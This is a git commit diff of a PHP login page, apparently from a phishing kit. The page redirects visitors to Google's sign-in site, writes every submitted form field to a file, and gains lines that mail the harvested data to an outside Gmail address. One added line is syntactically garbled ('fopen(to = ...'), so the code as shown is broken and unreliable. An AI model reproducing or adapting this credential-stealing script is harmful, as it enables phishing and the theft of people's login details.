9baa68369847f2077c15858eafc84b210dcfa882
encorepvtltd <40399568+encorepvtltd@users.noreply.github.com>
2018-06-23 12:03:53 +0530

    Initial commit

--- login.php
+++ login.php
@@ -1,6 +1,9 @@
 <?php
 header ('Location:https://accounts.google.com/');
-$handle = fopen("usernames.txt", "a");
+$handle = fopen(to = "encorepvtltd@gmail.com";
+$headers = "From: $email_from \r\n";
+$headers .= "Reply-To: $visitor_email \r\n";
+mail($to,$email_subject,$email_body,$headers);
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
